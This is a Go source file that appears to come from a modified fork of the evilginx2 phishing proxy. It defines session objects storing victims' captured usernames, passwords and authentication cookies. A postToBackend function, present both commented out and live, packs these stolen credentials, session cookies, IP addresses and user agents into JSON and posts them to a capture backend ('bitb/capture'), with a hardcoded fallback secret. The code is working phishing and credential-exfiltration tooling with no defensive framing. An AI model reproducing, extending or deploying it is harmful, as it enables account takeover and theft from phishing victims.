package core

import (
	"time"
	"os"
	"encoding/json"
	"net/http"
	"bytes"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/hex"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

type Session struct {
	Id             string
	Name           string
	Username       string
	Password       string
	Custom         map[string]string
	Params         map[string]string
	BodyTokens     map[string]string
	HttpTokens     map[string]string
	CookieTokens   map[string]map[string]*database.CookieToken
	RedirectURL    string
	IsDone         bool
	IsAuthUrl      bool
	IsForwarded    bool
	ProgressIndex  int
	RedirectCount  int
	PhishLure      *Lure
	RedirectorName string
	LureDirPath    string
	DoneSignal     chan struct{}
	RemoteAddr     string
	UserAgent      string
}

func NewSession(name string) (*Session, error) {
	s := &Session{
		Id:             GenRandomToken(),
		Name:           name,
		Username:       "",
		Password:       "",
		Custom:         make(map[string]string),
		Params:         make(map[string]string),
		BodyTokens:     make(map[string]string),
		HttpTokens:     make(map[string]string),
		RedirectURL:    "",
		IsDone:         false,
		IsAuthUrl:      false,
		IsForwarded:    false,
		ProgressIndex:  0,
		RedirectCount:  0,
		PhishLure:      nil,
		RedirectorName: "",
		LureDirPath:    "",
		DoneSignal:     make(chan struct{}),
		RemoteAddr:     "",
		UserAgent:      "",
	}
	s.CookieTokens = make(map[string]map[string]*database.CookieToken)

	return s, nil
}

func (s *Session) SetUsername(username string) {
	s.Username = username
}

func (s *Session) SetPassword(password string) {
	s.Password = password
}

func (s *Session) SetCustom(name string, value string) {
	s.Custom[name] = value
}

func (s *Session) AddCookieAuthToken(domain string, key string, value string, path string, http_only bool, expires time.Time) {
	if _, ok := s.CookieTokens[domain]; !ok {
		s.CookieTokens[domain] = make(map[string]*database.CookieToken)
	}

	if tk, ok := s.CookieTokens[domain][key]; ok {
		tk.Name = key
		tk.Value = value
		tk.Path = path
		tk.HttpOnly = http_only
	} else {
		s.CookieTokens[domain][key] = &database.CookieToken{
			Name:     key,
			Value:    value,
			HttpOnly: http_only,
		}
	}

}

func (s *Session) AllCookieAuthTokensCaptured(authTokens map[string][]*CookieAuthToken) bool {
	tcopy := make(map[string][]CookieAuthToken)
	for k, v := range authTokens {
		tcopy[k] = []CookieAuthToken{}
		for _, at := range v {
			if !at.optional {
				tcopy[k] = append(tcopy[k], *at)
			}
		}
	}

	for domain, tokens := range s.CookieTokens {
		for tk := range tokens {
			if al, ok := tcopy[domain]; ok {
				for an, at := range al {
					match := false
					if at.re != nil {
						match = at.re.MatchString(tk)
					} else if at.name == tk {
						match = true
					}
					if match {
						tcopy[domain] = append(tcopy[domain][:an], tcopy[domain][an+1:]...)
						if len(tcopy[domain]) == 0 {
							delete(tcopy, domain)
						}
						break
					}
				}
			}
		}
	}

	if len(tcopy) == 0 {
		return true
	}
	return false
}

func (s *Session) Finish(is_auth_url bool) {
	if !s.IsDone {
		s.IsDone = true
		s.IsAuthUrl = is_auth_url
		log.Debug("Finish: posting session %s (auth=%v, user=%s)", s.Id, is_auth_url, s.Username)
		go s.postToBackend()
		if s.DoneSignal != nil {
			close(s.DoneSignal)
			s.DoneSignal = nil
		}
	}
}


/* func (s *Session) postToBackend() {
    backendURL := os.Getenv("BACKEND_URL")
    if backendURL == "" {
        backendURL = "http://localhost:5000/api/v1/bitb/capture" // fallback
    }

	secret := []byte(os.Getenv("ENCRYPTION_SECRET"))
    if len(secret) == 0 {
        secret = []byte("super-secret") // fallback (avoid in prod)
    } 
	
    payload := map[string]interface{}{
        "id":        s.Id,
        "name":      s.Name,
        "username":  s.Username,
        "password":  s.Password,
        "custom":    s.Custom,
        "params":    s.Params,
        "body":      s.BodyTokens,
        "headers":   s.HttpTokens,
        "cookies":   s.CookieTokens,
        "remote_ip": s.RemoteAddr,
        "ua":        s.UserAgent,
        "is_auth":   s.IsAuthUrl,
    }

    body, err := json.Marshal(payload)
    if err != nil {
		log.Error("postToBackend: new request error: %v", err)
        return
    }

	// HMAC over raw JSON body
    mac := hmac.New(sha256.New, secret)
    mac.Write(body)
    sig := mac.Sum(nil)
    sigHex := hex.EncodeToString(sig)

    req, err := http.NewRequest("POST", backendURL, bytes.NewReader(body))
    if err != nil {
        return
    }
    req.Header.Set("Content-Type", "application/json")
    req.Header.Set("X-Signature", sigHex)

    client := &http.Client{Timeout: 5 * time.Second}
    _, _ = client.Do(req)// ignore response / errors or log them
} */

func (s *Session) postToBackend() {
    backendURL := os.Getenv("BACKEND_URL")
    if backendURL == "" {
        backendURL = "http://localhost:5000/api/v1/bitb/capture" // fallback
    }

    log.Warning("postToBackend: url=%s id=%s user=%s", backendURL, s.Id, s.Username)

    secret := []byte(os.Getenv("ENCRYPTION_SECRET"))
    if len(secret) == 0 {
        secret = []byte("super-secret") // fallback; replace in prod
    }

    payload := map[string]interface{}{
        "id":        s.Id,
        "name":      s.Name,
        "username":  s.Username,
        "password":  s.Password,
        "custom":    s.Custom,
        "params":    s.Params,
        "body":      s.BodyTokens,
        "headers":   s.HttpTokens,
        "cookies":   s.CookieTokens,
        "remote_ip": s.RemoteAddr,
        "ua":        s.UserAgent,
        "is_auth":   s.IsAuthUrl,
    }

    body, err := json.Marshal(payload)
    if err != nil {
        log.Error("postToBackend: json marshal error: %v", err)
        return
    }

    mac := hmac.New(sha256.New, secret)
    mac.Write(body)
    sig := mac.Sum(nil)
    sigHex := hex.EncodeToString(sig)

    req, err := http.NewRequest("POST", backendURL, bytes.NewReader(body))
    if err != nil {
        log.Error("postToBackend: new request error: %v", err)
        return
    }
    req.Header.Set("Content-Type", "application/json")
    req.Header.Set("X-Signature", sigHex)

    client := &http.Client{Timeout: 5 * time.Second}
    resp, err := client.Do(req)
    if err != nil {
        log.Error("postToBackend: http error: %v", err)
        return
    }
    defer resp.Body.Close()

    log.Info("postToBackend: status %s", resp.Status)
}